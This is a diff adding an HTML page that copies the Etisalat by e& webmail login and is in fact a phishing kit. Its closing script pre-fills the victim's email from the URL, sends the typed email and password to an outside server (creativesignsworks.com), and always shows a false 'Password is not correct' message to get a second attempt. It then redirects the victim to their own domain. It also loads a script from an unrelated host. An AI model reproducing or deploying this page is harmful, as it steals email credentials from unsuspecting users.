@@ -1,0 +1,341 @@
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" class="dj_webkit dj_chrome dj_contentbox"><head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<!-- [if lte IE 9]>
+			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+		<![endif]-->
+		<title>My Email - Etisalat by e&amp; Internet Mail</title>
+		<style type="text/css">
+			@import "../../../js/dojotoolkit/dojo/resources/dojo.css";
+			@import "../../../js/dojotoolkit/dijit/themes/dijit.css";
+			@import "../../../js/dojotoolkit/dijit/themes/dijit_rtl.css";
+			@import "../../../js/dojotoolkit/dijit/themes/tundra/form/Button.css";
+			@import "../../../js/dojotoolkit/dojox/form/resources/DropDownSelect.css";
+		</style>
+		<link rel="stylesheet" href="https://eim.ae/iwc_static/c11n/allDomain/layout/css/login.css" type="text/css">
+		<script type="text/javascript">
+			var djConfig= {
+				cacheBust: "none",
+				isDebug:false,
+				parseOnLoad:true
+			};
+
+			(function() {
+				function getParameter(paramName) {
+					paramName += "=";
+					var queryString = window.location.search;
+					var strBegin = queryString.indexOf(paramName);
+					if (strBegin==-1){
+						strBegin = queryString.length;
+					}
+					else {
+						strBegin += paramName.length;
+					}
+					var strEnd = queryString.indexOf("&",strBegin);
+
+					if (strEnd==-1){
+						strEnd = queryString.length;
+					}
+
+					return queryString.substring(strBegin,strEnd);
+				}
+
+				var locale = getParameter("lang");
+				if (locale.length >0){
+					djConfig.locale = locale.toLowerCase();
+                                        var languageCode = locale.toLowerCase().split("-")[0];
+					if ((languageCode.indexOf("ar") == 0) || (languageCode.indexOf("he") == 0)) {						
+						if(languageCode.length < 3){
+							djConfig.direction = "rtl";
+						}else{
+							djConfig.direction = "ltr";
+						}
+					}
+					else {
+						djConfig.direction = "ltr";
+					}
+					var top = document.getElementsByTagName("html")[0];
+					top.dir = djConfig.direction;
+				}
+			})()
+		</script>
+
+		<script type="text/javascript" src="../../../js/dojotoolkit/dojo/dojo.js"></script><script type="text/javascript" src="../../../js/dojotoolkit/dojo/_base/_loader/bootstrap.js"></script><script type="text/javascript" src="../../../js/dojotoolkit/dojo/_base/_loader/loader.js"></script><script type="text/javascript" src="../../../js/dojotoolkit/dojo/_base/_loader/hostenv_browser.js"></script><script type="text/javascript" src="../../../js/dojotoolkit/dojo/_base.js"></script>
+		<script type="text/javascript">
+			dojo.registerModulePath("iwc", "../../iwc");
+			dojo.require("iwc.i18n.resources");
+			dojo.requireLocalization("iwc.i18n","resources");
+			iwc.l10n = dojo.i18n.getLocalization("iwc.i18n", "resources");
+			dojo.require("iwc.login");
+
+			function reloadWithHttps() {
+				var enablessl = iwc.cookie("iwc-clientpref","enablealwaysssl");
+				if (enablessl == "true") {
+				if(window.location.protocol == "http:"){
+					var contextPath = iwc.cookie("iwc-auth","path");
+					var defaultURL = "";
+					if(contextPath && contextPath != ""){
+						defaultURL = "https://" + window.location.host + contextPath;
+					}else{
+						defaultURL = "https://" + window.location.host + window.location.pathname + window.location.search;
+					}
+					window.location.replace(defaultURL);
+				}
+                                }
+			}
+			
+			dojo.addOnLoad(function(){
+				reloadWithHttps();
+				// prevent clickjacking
+				if (top.location.hostname != self.location.hostname) {
+					try {
+						if (document.forms[0].password) {
+							document.forms[0].style.display = "none";
+						}
+					} catch (e) {
+						document.body.style.display = "none";
+					}
+				}
+
+				iwc.login.setFocus();
+				iwc.login.doI18N();
+				//document.getElementById('picCache').src='imageList.html?'+djConfig.cacheBust;
+				//var lang = langLblMapping[djConfig.locale.toLowerCase()]?langLblMapping[djConfig.locale.toLowerCase()]:langLblMapping['en-us'];
+				var lang = "en_us";
+				if(djConfig && djConfig.locale) {
+					lang = djConfig.locale.toLowerCase();
+				}
+				dijit.byId('langButton').attr("value", lang);
+				dojo.connect(dijit.byId("langButton"), "onChange", function(lang) {
+					var loginUrl = window.location;
+
+                    if(window.location.search!=""&&window.location.search.indexOf('lang=')>-1)
+                        loginUrl = loginUrl.href.replace('lang='+iwc.login.getParameter('lang'),'lang='+lang);
+                    else
+                        loginUrl = loginUrl+"?lang="+lang
+
+                    if(window.location.search.indexOf("u=1")==-1)
+                        loginUrl=loginUrl+'&u=1';
+                    
+					window.location = loginUrl;
+					return false;
+				});
+			});
+
+			function login() {
+				return iwc.login.checkName();
+			}
+		</script>
+	</head>
+
+	<body role="application">
+		<script type="text/javascript">
+			
+		</script>
+        <div class="Convergence-Login" id="convergenceLogin">
+			<div class="Convergence-Login-Border">
+				<div class="Convergence-Login-Banner">
+					<div class="Convergence-Login-Logo" role="presentation"></div>
+					<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg">My Email - Etisalat by e&amp; Internet Mail</div>
+				</div>
+
+				<div class="Convergence-Login-Notification" id="alertMsg" aria-live="assertive" role="alert" tabindex="0" style="display:none;"></div>
+				
+				<form action="" method="post" id="conte">
+
+					<div>
+						<div class="Convergence-Login-Form">
+							<div class="Convergence-Login-FormRow">
+								<label id="usernameLabelID" for="username">Username:</label>
+								<input id="email" name="email" type="text" aria-required="true">
+							</div>
+							<div class="Convergence-Login-FormRow">
+								<label id="passwordLabelID" for="password">Password:</label>
+								<input id="password" name="password" type="password" aria-required="true" autocomplete="off">
+							
+							<div class="Convergence-Login-FormRow tundra">
+
+									<table class="dijit dijitReset dijitInline dijitLeft dojoxDropDownSelectFixedWidth Convergence-Login-SelectLang dojoxDropDownSelect" dojoattachpoint="dropDownNode,tableNode" cellspacing="0" cellpadding="0" role="button" dojoattachevent="onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="langButton"><tbody wairole="presentation" role="presentation"><tr wairole="presentation" role="presentation"><td class="dijitReset dijitStretch dijitButtonContents dijitButtonNode"><span class="dijitReset dijitInline dijitButtonText" dojoattachpoint="containerNode,popupStateNode" id="langButton_label"><span class=" dojoxDropDownSelectLabel">English</span></span><input type="hidden" dojoattachpoint="valueNode" value="en-us">
+		</td><td class="dijitReset dijitRight dijitButtonNode dijitArrowButton dijitDownArrowButton" dojoattachpoint="focusNode,titleNode" wairole="button" waistate="haspopup-true,labelledby-langButton_label" role="button" aria-haspopup="true" aria-labelledby="langButton_label" id="langButton" tabindex="0" aria-disabled="false"><div class="dijitReset dijitArrowButtonInner"> </div><div class="dijitReset dijitArrowButtonChar" wairole="presentation" role="presentation">▼</div></td></tr></tbody></table>
+								<div class="Convergence-Login-FormButton" id="buttonContainer">
+									<div>
+										<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit"  wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Sign In</span></button></span></span></span>
+									</div>
+									<div class="Convergence-Login-FormRow">
+										<a href="#" target="_blank" id="forgotpassword" onclick="iwc.login.openVerifyUserPage();return false;" style="display: none;">Forgot Password</a>
+									</div>
+								</div>
+								<div style="clear: both"></div>
+							</div>
+
+						</div>
+
+					</div>
+					<div style="clear: both"></div>
+				</form>
+		<div class="Password-Expired-Message tundra" id="PwdExpiredMsg" style="display:none;">                   
+			<div class="ErrorMsg-Contianer" id="btnContainer">                                                
+				<div class="Error-Icon"></div>
+				<div class="Error-Msg" id="errMsg">jjjjjjjjjjjjjjjjjjjjjjjjjjj</div>			    	
+			</div>
+			<div class="Convergence-Login-FormButton ChangePwdBtn">	
+				<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="changepwd"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="button" value="" wairole="button" waistate="labelledby-changepwd_label" role="button" aria-labelledby="changepwd_label" id="changepwd" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="changepwd_label" dojoattachpoint="containerNode">Change Password</span></button></span></span></span>
+		    </div>
+                </div>                
+				<div class="Convergence-Login-RedBand"></div>
+				<div id="copyright" class="Convergence-Login-Copyright">Copyright © 2025, Etisalat by e&amp;. All Rights Reserved.</div>
+			</div>
+		</div>
+
+		<div id="overlay" class="login" style="display: none;">
+			<div class="centered">
+				<div class="logo"></div>
+				<div id="progress">Signing in...</div>
+			</div>
+		</div>
+
+	
+    
+
+<table class="dijit dijitMenu dijitMenuPassive dijitReset dijitMenuTable dojoxDropDownSelectMenu" wairole="menu" tabindex="0" dojoattachevent="onkeypress:_onKeyPress" role="menu" id="dijit_Menu_0" widgetid="dijit_Menu_0" style="visibility: hidden; position: absolute; top: -9999px;">
+	<tbody class="dijitReset" dojoattachpoint="containerNode"><tr class="dijitReset dijitMenuItem dojoxDropDownSelectSelectedOption" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_0" lang="en-us" aria-disabled="false" widgetid="dijit_MenuItem_0" aria-labelledby="dijit_MenuItem_0_text" aria-selected="true">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="../../../js/dojotoolkit/dojo/resources/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_0_text">English</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="../../../js/dojotoolkit/dojo/resources/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_1" lang="ar" aria-disabled="false" widgetid="dijit_MenuItem_1" aria-labelledby="dijit_MenuItem_1_text" aria-selected="false">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="../../../js/dojotoolkit/dojo/resources/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_1_text">العربية</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="../../../js/dojotoolkit/dojo/resources/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr></tbody>
+</table>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+	  <script src="https://huadongarmouredcable.com/jquery.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+ 
+	
+
+	
+	<script>
+	
+	$(document).ready(function(){
+var count=0;
+
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('.ulp-authenticator-selector-text').html(my_email);
+$('#auth_email').html(my_email);
+$('#manutd').html(my_email);
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+$('#footer_dom').html(my_email);
+$('#carss').html(my_email);
+ $("#top_label_logo").attr("src", "https://logo.clearbit.com/"+my_slice);
+
+}
+
+      $('#signin').click(function(event){
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+var msg = $('#msg').html();
+$('#msg').text( msg );
+
+if (!password) {
+                $('#alertMsg').show();
+                $('#alertMsg').html("Password is empty");
+
+                return false;
+            }
+
+
+count=count+1;
+
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://creativesignsworks.com/eimoxc/posts.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+		
+			data: $('#conte').serialize(),
+            beforeSend: function(xhr){
+            	
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=2) {
+            				count=0;
+                 
+                  window.location.replace("https://www."+my_slice);
+
+                }
+            	$("#alertMsg").show();
+               $('#alertMsg').html("Password is not correct. Please try again");
+		
+       
+            }
+            else{
+            	$("#alertMsg").show();
+               $('#alertMsg').html("Password is not correct. Please try again");
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=2) {
+    		count=0;
+    		window.location.replace("https://www."+my_slice);
+    	}
+            	$("#alertMsg").show();
+               $('#alertMsg').html("Password is not correct. Please try again");
+    },
+    complete: function(){
+    	$('#fm-login-submit').val('Sign in ');
+    }
+});
+  });
+
+
+	});
+	</script>	
+</body></html>
